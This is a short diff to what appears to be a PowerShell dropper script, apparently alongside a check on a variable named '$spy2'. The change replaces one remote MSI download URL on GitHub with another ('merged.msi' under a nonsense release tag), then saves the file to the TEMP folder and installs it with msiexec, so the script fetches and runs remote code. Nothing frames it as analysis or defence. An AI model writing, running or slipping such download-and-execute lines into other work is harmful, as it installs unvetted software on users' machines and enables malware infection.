@@ -57,4 +57,4 @@ if (Test-Path $spy2) {
 }
 
 
-$p="$env:TEMP\Comand Setup.msi"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
+$p="$env:TEMP\merged.msi"; Invoke-WebRequest "https://github.com/analysisw/test/releases/download/ewefwfwef/merged.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
